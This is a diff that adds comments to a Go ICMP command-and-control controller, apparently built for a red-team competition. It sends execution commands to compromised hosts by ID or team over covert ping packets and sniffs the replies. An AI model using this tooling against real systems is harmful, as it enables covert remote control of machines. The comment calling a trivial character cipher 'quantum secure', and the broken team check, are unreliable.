@@ -83,6 +83,7 @@ func RemoveAllClients() {
 	}
 }
 
+// Sort clients and list by ID
 func ShowClients() {
 	keys := SortMap()
 	for _, k := range keys {
@@ -91,6 +92,7 @@ func ShowClients() {
 	}
 }
 
+// Convert client map to a sorted slice
 func SortMap() []int {
 	keys := make([]int, 0, len(clients))
 	for k := range clients {
@@ -100,6 +102,7 @@ func SortMap() []int {
 	return (keys)
 }
 
+// Using Python built targets file, add clients (for competition use)
 func LoadClients() {
 	readFile, err := os.Open("targets.txt")
 	if err != nil {
@@ -119,21 +122,26 @@ func LoadClients() {
 	}
 }
 
+// Send a command to an entire specified team
 func SendToTeam(team int, message string) {
+	// If there is no targets file or is an invalid team, print error
 	if NumOfTeams == 0 {
 		fmt.Println("[ERROR] No teams loaded.")
 	}
 	if team > NumOfTeams || team < NumOfTeams {
 		fmt.Println("[ERROR] Invalid team.")
 	}
+
 	teamnum := 1
 	i := 0
 	fmt.Println("Team:", teamnum)
+	// For every client, check if it matches the team, then send
 	for clientindex := 0; clientindex < len(clients); clientindex++ {
 		fmt.Println("ID:", clientindex)
 		if teamnum == team {
 			Send(message, clientindex)
 		}
+		// Calculate what clients are on each team, and incrememt team number on match
 		if i == len(clients)/NumOfTeams-1 {
 			teamnum++
 			i = 0
@@ -143,6 +151,7 @@ func SendToTeam(team int, message string) {
 	}
 }
 
+// Iterate through all clients and send message
 func SendToAll(message string) {
 	for id := range clients {
 		Send(message, id)
@@ -182,36 +191,48 @@ func SendToBox(ip string, command string) {
 
 func GenerateHeader(segment int, segmented bool, ip string) string {
 	SegmentNum := strconv.Itoa(segment)
+
+	// Server flag
 	header := "!!!"
-	// ### is server flag
+
 	// Value 1 (SSM) is Encryption option
-	// Value 2 is execution option
-	// Value 3 is segment for oversized packets
-	// Value 4 is segment ID
 	if SSM {
 		header += "1"
 	} else {
 		header += "0"
 	}
+
+	// Value 2 is execution option
 	if execute {
 		header += "1"
 	} else {
 		header += "0"
 	}
+
+	// Value 3 is yes/no for segmentation
 	if segmented {
 		header += "1"
 	} else {
 		header += "0"
 	}
+
+	// Value 4 is segment ID
 	header += SegmentNum
-	header += "[" + ip + "]" // Append IP to header for NAT
+
+	// Append IP to header for extra validation
+	header += "[" + ip + "]"
+
 	return header
 }
 
+// Make the custom ICMP packet using the specified payload
 func MakePacket(payload string) {
+	// If SuperSecretMode is enabled, encrypt the payload
 	if SSM {
 		payload = payload[0:8] + encrypt(payload[8:])
 	}
+
+	// Generate packet using the payload
 	packet := icmp.Message{
 		Type: ipv4.ICMPTypeEcho,
 		Code: 0,
@@ -221,9 +242,12 @@ func MakePacket(payload string) {
 			Data: []byte(payload),
 		},
 	}
+
+	// Add the packet to the packet queue for sending
 	PacketQueue = append(PacketQueue, packet)
 }
 
+// Using the packet listener and an IP address, send everything in the packet queue
 func SendPackets(addr string, c icmp.PacketConn) {
 	for _, packet := range PacketQueue {
 		binaryEncoding, _ := packet.Marshal(nil)
@@ -238,9 +262,13 @@ func SendPackets(addr string, c icmp.PacketConn) {
 	}
 }
 
+// Create and send a packet to a client by their ID
 func Send(message string, id int) {
+	// If the message exceeds 1460 bytes, send the message in segments
 	if len(message) > 1460 {
 		segment := 0
+
+		// While the message exceeds 1460 bytes, send a piece of the message
 		for len(message) > 1460 {
 			payload := GenerateHeader(segment, true, clients[id]) + message[0:1460]
 			MakePacket(payload)
@@ -249,25 +277,29 @@ func Send(message string, id int) {
 			message = message[1460:]
 			segment++
 		}
+
+		// Send the remainder of the data
 		payload := GenerateHeader(segment, true, clients[id]) + message[0:]
 		MakePacket(payload)
 	} else {
+		// If smaller than 1460 bytes, make and send the packets
 		payload := GenerateHeader(0, false, clients[id]) + message
 		MakePacket(payload)
 		SendPackets(clients[id], *c)
 	}
+	// Print the sent message and empty the queue
 	fmt.Println("[DEBUG]", message, "sent to client", id, "at", clients[id])
 	PacketQueue = nil
 }
 
 func CheckTwoStrings(words []string) bool {
 	if len(words) == 1 {
-		fmt.Println("Usage: add <IP Address>")
+		fmt.Println("Invalid usage, type \"help\" for help.")
 		return false
 	}
 	words = strings.Split(words[1], " ")
 	if len(words) != 1 {
-		fmt.Println("Usage: add <IP Address>")
+		fmt.Println("Invalid usage, expecting two arguments.")
 		return false
 	}
 	return true
@@ -279,6 +311,7 @@ func ParseID(args []string) (string, int) {
 	return ParsedArgs[1], id
 }
 
+// Quantum secure encryption algorithm
 func encrypt(plaintext string) string {
 	encrypted := ""
 	for i := range plaintext {
@@ -287,6 +320,7 @@ func encrypt(plaintext string) string {
 	return encrypted
 }
 
+// Quantum secure decryption algorithm
 func decrypt(plaintext string) string {
 	encrypted := ""
 	for i := range plaintext {
@@ -295,18 +329,23 @@ func decrypt(plaintext string) string {
 	return encrypted
 }
 
+// Convert byte values to string
 func convert(values []byte) string {
 	var converted string
 	converted = bytes.NewBuffer(values).String()
 	return converted
 }
 
+// Start the packet sniffer
 func sniffer() {
+	// Create the handler on the defualt Ubuntu interface
 	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer handler.Close()
+
+	// Set the filter to only look at ICMP packets
 	if err := handler.SetBPFFilter(filter); err != nil {
 		log.Fatal(err)
 	}
